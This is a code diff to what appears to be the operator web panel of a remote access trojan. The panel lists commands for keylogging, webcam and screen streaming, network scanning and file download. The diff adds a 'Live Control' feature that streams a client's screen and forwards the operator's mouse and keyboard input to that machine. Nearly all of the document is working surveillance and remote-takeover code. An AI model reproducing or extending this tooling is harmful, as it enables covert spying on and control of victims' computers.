@@ -364,13 +364,39 @@
   <!-- Notifications Container -->
   <div id="notifications" class="notifications-container space-y-2"></div>
 
+  <!-- Live Control Modal -->
+  <div id="live-control-modal" class="fixed inset-0 bg-black bg-opacity-80 flex items-center justify-center z-50 hidden">
+    <div id="live-control-content" class="w-full h-full p-4 flex flex-col">
+      <div class="flex items-center justify-between mb-2 text-white">
+        <h2 class="text-xl font-bold">Live Control: <span id="live-control-client-name"></span></h2>
+        <div id="live-control-status" class="text-sm">Connecting...</div>
+        <button id="close-live-control" class="bg-red-600 hover:bg-red-700 text-white px-4 py-2 rounded-lg">
+          <i class="fas fa-times mr-2"></i>Close
+        </button>
+      </div>
+      <div class="flex-1 relative w-full h-full bg-black flex items-center justify-center">
+        <img id="live-control-image" class="max-w-full max-h-full cursor-none">
+        <div id="live-control-loading" class="text-white text-2xl">
+            <i class="fas fa-spinner fa-spin mr-2"></i>Waiting for stream...
+        </div>
+      </div>
+    </div>
+  </div>
+
   <script>
     // --- GLOBAL STATE & CONFIG ---
     let ws = null;
     let selectedClients = new Set();
+    let allClients = []; // To store full client data
     let reconnectAttempts = 0;
     const MAX_RECONNECT_ATTEMPTS = 5;
     const RECONNECT_DELAY = 3000;
+
+    // Live Control State
+    let liveControlActive = false;
+    let controlledClientId = null;
+    let clientScreenDimensions = { width: 1, height: 1 }; // Avoid division by zero
+    let lastKey = '';
 
     const COMMANDS = [
         { cmd: '/help', desc: 'Shows this help message.' },
@@ -390,7 +416,7 @@
         { cmd: '/msgbox <text>', desc: 'Displays a message box.' },
         { cmd: '/network_scan <cidr>', desc: 'Scans the network for hosts.' },
         { cmd: '/webcam_list', desc: 'Lists available webcams.' },
-        { cmd: '/webcam_start <index>', desc: 'Starts the webcam stream.' },
+        { cmd: '/webcam_start <index> [res]', desc: 'Starts webcam stream (e.g., /webcam_start 0 1280x720).' },
         { cmd: '/webcam_stop', desc: 'Stops the webcam stream.' },
         { cmd: '/screenstream_start', desc: 'Starts the screen stream.' },
         { cmd: '/screenstream_stop', desc: 'Stops the screen stream.' },
@@ -427,6 +453,11 @@
         serverStatsLoading: $('#server-stats-loading'),
         serverStatsContent: $('#server-stats-content'),
         notifications: $('#notifications'),
+        liveControlModal: $('#live-control-modal'),
+        liveControlImage: $('#live-control-image'),
+        liveControlStatus: $('#live-control-status'),
+        liveControlClientName: $('#live-control-client-name'),
+        liveControlLoading: $('#live-control-loading'),
     };
 
     // --- UTILITY & HELPER FUNCTIONS ---
@@ -538,7 +569,10 @@
 
     function handleWebSocketMessage(data) {
         const handlers = {
-            'client_list': (d) => updateClientList(d.clients || []),
+            'client_list': (d) => {
+                allClients = d.clients || [];
+                updateClientList(allClients);
+            },
             'client_connected': (d) => {
                 showNotification(`New client connected: ${d.client.hostname}`, 'success');
                 requestClientList();
@@ -551,7 +585,17 @@
             },
             'command_output': (d) => logOutput(`<pre class="whitespace-pre-wrap">${d.output}</pre>`, 'info'),
             'screenshot': (d) => displayScreenshot(d.data),
-            'screen_frame': (d) => displayStreamFrame(d.data, DOM.screenCanvas, DOM.screenStreamContainer, DOM.screenStatus),
+            'screen_frame': (d) => {
+                if (liveControlActive && d.client_id === controlledClientId) {
+                    DOM.liveControlImage.src = `data:image/jpeg;base64,${d.data}`;
+                    if (DOM.liveControlLoading.classList.contains('hidden') === false) {
+                        DOM.liveControlLoading.classList.add('hidden');
+                        DOM.liveControlImage.classList.remove('hidden');
+                    }
+                } else {
+                    displayStreamFrame(d.data, DOM.screenCanvas, DOM.screenStreamContainer, DOM.screenStatus);
+                }
+            },
             'webcam_frame': (d) => displayStreamFrame(d.data, DOM.webcamCanvas, DOM.webcamContainer, DOM.webcamStatus),
             'file_download': (d) => downloadFile(d.filename, d.data),
             'error': (d) => {
@@ -596,14 +640,17 @@
                 <div class="flex items-center"><div class="status-dot w-3 h-3 bg-green-400 rounded-full mr-3"></div><i class="${osIcon} text-lg mr-2"></i><span class="font-medium text-white">${client.hostname}</span></div>
                 ${isSelected ? '<i class="fas fa-check-circle text-blue-400"></i>' : ''}
             </div>
-            <div class="text-sm text-gray-300"><div class="flex justify-between"><span>IP:</span><span>${client.ip}</span></div><div class="flex justify-between"><span class="truncate" title="${client.os}">OS:</span><span class="text-xs text-right truncate">${client.os}</span></div></div>`;
-        
-        div.addEventListener('click', () => {
-            if (selectedClients.has(client.id)) selectedClients.delete(client.id);
-            else selectedClients.add(client.id);
-            updateSelectedCount();
-            updateClientVisuals();
-        });
+            <div class="text-sm text-gray-300">
+                <div class="flex justify-between"><span>IP:</span><span>${client.ip}</span></div>
+                <div class="flex justify-between"><span class="truncate" title="${client.os}">OS:</span><span class="text-xs text-right truncate">${client.os}</span></div>
+            </div>
+            <div class="border-t border-gray-700 my-2"></div>
+            <div class="flex justify-end">
+                <button class="live-control-btn bg-gray-700 hover:bg-blue-600 text-white px-3 py-1 rounded-lg text-xs transition duration-200">
+                    <i class="fas fa-eye mr-1"></i>Live Control
+                </button>
+            </div>
+        `;
         return div;
     }
 
@@ -637,7 +684,7 @@
         if (!command) return;
 
         if (command === '/help') {
-            const helpText = COMMANDS.map(c => `${c.cmd.padEnd(25, ' ')} - ${c.desc}`).join('\n');
+            const helpText = COMMANDS.map(c => `${c.cmd.padEnd(35, ' ')} - ${c.desc}`).join('\n');
             logOutput(`<pre>${helpText}</pre>`, 'info');
             DOM.commandInput.value = '';
             return;
@@ -650,6 +697,13 @@
         
         const [actionWithSlash, ...args] = command.split(' ');
         const action = actionWithSlash.startsWith('/') ? actionWithSlash.substring(1) : 'exec';
+
+        // Streaming commands validation
+        const streamingActions = ['screenstream_start', 'webcam_start'];
+        if (streamingActions.includes(action) && selectedClients.size !== 1) {
+            showNotification(`Streaming commands can only be sent to a single client.`, 'warning');
+            return;
+        }
         
         const payload = { action, target_ids: Array.from(selectedClients) };
 
@@ -664,7 +718,7 @@
         } else if (action === 'network_scan') {
             payload.range = args[0];
         } else if (action === 'webcam_start') {
-            payload.index = args[0];
+            payload.args = args; // Pass all arguments
         } else if (action === 'keylogger') {
             payload.count = args[0];
         }
@@ -793,6 +847,146 @@
         });
     }
 
+    // --- LIVE CONTROL ---
+    const keyMap = {
+        "Control": "ctrl", "Shift": "shift", "Alt": "alt", "Meta": "cmd",
+        "ArrowUp": "up", "ArrowDown": "down", "ArrowLeft": "left", "ArrowRight": "right",
+        "Enter": "enter", "Backspace": "backspace", "Tab": "tab", "Escape": "esc",
+        "Delete": "delete", "Insert": "insert", "Home": "home", "End": "end",
+        "PageUp": "pageup", "PageDown": "pagedown", "F1": "f1", "F2": "f2",
+        "F3": "f3", "F4": "f4", "F5": "f5", "F6": "f6", "F7": "f7", "F8": "f8",
+        "F9": "f9", "F10": "f10", "F11": "f11", "F12": "f12"
+    };
+
+    function startLiveControl(clientId) {
+        const client = allClients.find(c => c.id === clientId);
+        if (!client) {
+            showNotification('Client not found for live control.', 'error');
+            return;
+        }
+
+        if (liveControlActive) {
+            showNotification('Another live control session is already active.', 'warning');
+            return;
+        }
+
+        liveControlActive = true;
+        controlledClientId = clientId;
+        clientScreenDimensions = client.screen || { width: 1920, height: 1080 };
+        if (clientScreenDimensions.width === 0) clientScreenDimensions = { width: 1920, height: 1080 };
+
+        DOM.liveControlClientName.textContent = client.hostname;
+        DOM.liveControlModal.classList.remove('hidden');
+        DOM.liveControlImage.classList.add('hidden');
+        DOM.liveControlLoading.classList.remove('hidden');
+
+        ws.send(JSON.stringify({ action: 'screenstream_start', target_ids: [clientId] }));
+
+        attachLiveControlEvents();
+    }
+
+    function stopLiveControl() {
+        if (!liveControlActive) return;
+
+        ws.send(JSON.stringify({ action: 'screenstream_stop', target_ids: [controlledClientId] }));
+
+        liveControlActive = false;
+        controlledClientId = null;
+        DOM.liveControlModal.classList.add('hidden');
+        DOM.liveControlImage.src = ''; // Clear image
+        
+        detachLiveControlEvents();
+    }
+
+    function attachLiveControlEvents() {
+        DOM.liveControlImage.addEventListener('mousemove', handleMouseMove);
+        DOM.liveControlImage.addEventListener('mousedown', handleMouseDown);
+        DOM.liveControlImage.addEventListener('mouseup', handleMouseUp);
+        DOM.liveControlImage.addEventListener('wheel', handleMouseWheel);
+        DOM.liveControlImage.addEventListener('contextmenu', (e) => e.preventDefault()); // Allow right click
+        document.addEventListener('keydown', handleKeyDown);
+        document.addEventListener('keyup', handleKeyUp);
+    }
+
+    function detachLiveControlEvents() {
+        DOM.liveControlImage.removeEventListener('mousemove', handleMouseMove);
+        DOM.liveControlImage.removeEventListener('mousedown', handleMouseDown);
+        DOM.liveControlImage.removeEventListener('mouseup', handleMouseUp);
+        DOM.liveControlImage.removeEventListener('wheel', handleMouseWheel);
+        document.removeEventListener('keydown', handleKeyDown);
+        document.removeEventListener('keyup', handleKeyUp);
+    }
+
+    function getScaledCoords(e) {
+        const rect = DOM.liveControlImage.getBoundingClientRect();
+        const imgWidth = DOM.liveControlImage.offsetWidth;
+        const imgHeight = DOM.liveControlImage.offsetHeight;
+
+        const x = Math.round((e.clientX - rect.left) * (clientScreenDimensions.width / imgWidth));
+        const y = Math.round((e.clientY - rect.top) * (clientScreenDimensions.height / imgHeight));
+
+        return { x: Math.max(0, x), y: Math.max(0, y) };
+    }
+
+    function handleMouseMove(e) {
+        const { x, y } = getScaledCoords(e);
+        ws.send(JSON.stringify({
+            action: 'mouse',
+            target_ids: [controlledClientId],
+            data: { type: 'move', x, y }
+        }));
+    }
+
+    function handleMouseDown(e) {
+        e.preventDefault();
+        const buttonMap = { 0: 'left', 1: 'middle', 2: 'right' };
+        ws.send(JSON.stringify({
+            action: 'mouse',
+            target_ids: [controlledClientId],
+            data: { type: 'click', button: buttonMap[e.button], clicks: 1 }
+        }));
+    }
+
+    function handleMouseUp(e) {
+        // MouseUp is not explicitly handled by pyautogui, mousedown is sufficient for a click
+    }
+
+    function handleMouseWheel(e) {
+        e.preventDefault();
+        ws.send(JSON.stringify({
+            action: 'mouse',
+            target_ids: [controlledClientId],
+            data: { type: 'scroll', delta_y: -Math.sign(e.deltaY) } // Invert for pyautogui
+        }));
+    }
+
+    function handleKeyDown(e) {
+        if (!liveControlActive) return;
+        e.preventDefault();
+        const key = keyMap[e.key] || e.key.toLowerCase();
+        // Prevent key repeat spam
+        if (key === lastKey) return;
+        lastKey = key;
+        
+        ws.send(JSON.stringify({
+            action: 'keyboard',
+            target_ids: [controlledClientId],
+            data: { key: key, down: true }
+        }));
+    }
+
+    function handleKeyUp(e) {
+        if (!liveControlActive) return;
+        e.preventDefault();
+        lastKey = '';
+        const key = keyMap[e.key] || e.key.toLowerCase();
+        ws.send(JSON.stringify({
+            action: 'keyboard',
+            target_ids: [controlledClientId],
+            data: { key: key, down: false }
+        }));
+    }
+
     // --- EVENT LISTENERS ---
     function setupEventListeners() {
         $('#send-command').addEventListener('click', sendCommandToClients);
@@ -805,6 +999,22 @@
         DOM.commandInput.addEventListener('input', showCommandSuggestions);
         document.addEventListener('click', (e) => {
             if (!DOM.commandInput.contains(e.target)) hideCommandSuggestions();
+        });
+
+        // Event delegation for client list
+        DOM.clientList.addEventListener('click', (e) => {
+            const card = e.target.closest('.client-card');
+            if (!card) return;
+            const clientId = card.dataset.clientId;
+
+            if (e.target.closest('.live-control-btn')) {
+                startLiveControl(clientId);
+            } else {
+                if (selectedClients.has(clientId)) selectedClients.delete(clientId);
+                else selectedClients.add(clientId);
+                updateSelectedCount();
+                updateClientVisuals();
+            }
         });
 
         $('.quick-action').forEach(btn => {
@@ -872,6 +1082,9 @@
         $('#server-stats-btn').addEventListener('click', loadServerStats);
         $('#close-stats-modal').addEventListener('click', () => DOM.serverStatsModal.classList.add('hidden'));
         $('#refresh-stats').addEventListener('click', loadServerStats);
+
+        // Live Control Listeners
+        $('#close-live-control').addEventListener('click', stopLiveControl);
     }
 
     // --- INITIALIZATION ---
